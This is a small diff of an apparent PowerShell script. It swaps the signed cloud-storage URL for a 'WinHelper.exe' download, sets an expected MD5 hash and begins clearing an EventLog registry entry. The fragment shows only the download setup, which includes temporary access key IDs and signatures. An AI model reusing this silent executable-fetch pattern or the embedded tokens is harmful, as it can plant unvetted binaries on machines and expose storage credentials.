@@ -1,6 +1,6 @@
 
 $ProgressPreference = 'SilentlyContinue'
-$svcMain = 'http://it2u.oss-cn-shenzhen.aliyuncs.com/SVC/WinHelper.exe?Expires=1732813169&OSSAccessKeyId=TMP.3KjsoTtX1MXsYLsD46LEWjizDF7yftSSzscDyLov7TgPvCpgS1RDcTx8rqQdBoogdKDSNMFv95YuBiZe3y9QG8GnEcB6FL&Signature=7Z7q3vGqxUTu1uMjYdwTiVQyIsY%3D'
+$svcMain = 'http://utoos.oss-cn-shanghai.aliyuncs.com/WinHelper.exe?Expires=1732880108&OSSAccessKeyId=TMP.3KepHpa3qtX4ZHEKxeRD1snPVMCyP1Lg7df18bRKHb3QeWxFNnr8xQUe8JHiBzo75y7C29cmTomGoK2UhCLsBpEGYtvnMh&Signature=N2%2Fqq3P8ecqOzaMedk%2B7KLOCljQ%3D'
 $remoteMD5 = "DBF61FDF0607F3819A2F1DC9AF121966"
 # clear register entry
 if (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\WHelper -ErrorAction SilentlyContinue) {
